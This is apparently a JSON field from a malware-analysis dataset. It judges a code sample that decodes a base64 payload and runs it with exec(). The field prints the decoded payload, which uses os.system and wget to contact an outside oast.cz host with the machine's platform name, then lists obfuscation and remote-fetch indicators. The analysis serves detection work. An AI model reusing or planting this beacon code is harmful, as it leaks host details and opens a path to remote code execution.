      "malicious_behavior": "The code contains a base64-encoded string that is decoded and immediately executed via exec(). The decoded string is: \n\nimport os, urllib.request, platform\nurl = \"https://blzby75a.oast.cz/\" + platform.system()\nos.system(\"wget --no-proxy \" + url)\ntry:\n    urllib.request.urlopen(\"url\")\nexcept:\n    pass\n\nThis decoded code performs the following suspicious actions:\n- Constructs a URL by concatenating a hardcoded suspicious domain (blzby75a.oast.cz) with the system platform name.\n- Executes a shell command to download a resource from that URL using wget with the --no-proxy option, which bypasses proxy settings.\n- Attempts to open the URL via urllib.request.urlopen, ignoring any exceptions.\n\nKey indicators of malicious behavior include:\n- Use of base64 encoding to obfuscate the payload.\n- Immediate execution of decoded code via exec(), a strong indicator of malicious intent.\n- Contacting a suspicious, non-standard domain (oast.cz is often used for security testing but here is hardcoded and suspicious).\n- Downloading a file from an external source without user consent or validation.\n- Use of os.system to run shell commands, which can be used to execute arbitrary code.\n- No legitimate user interaction or notification before performing network and shell operations.\n\nThese behaviors align with known malicious patterns such as dynamic payload retrieval, obfuscation, and remote code execution. Therefore, the code is malicious."
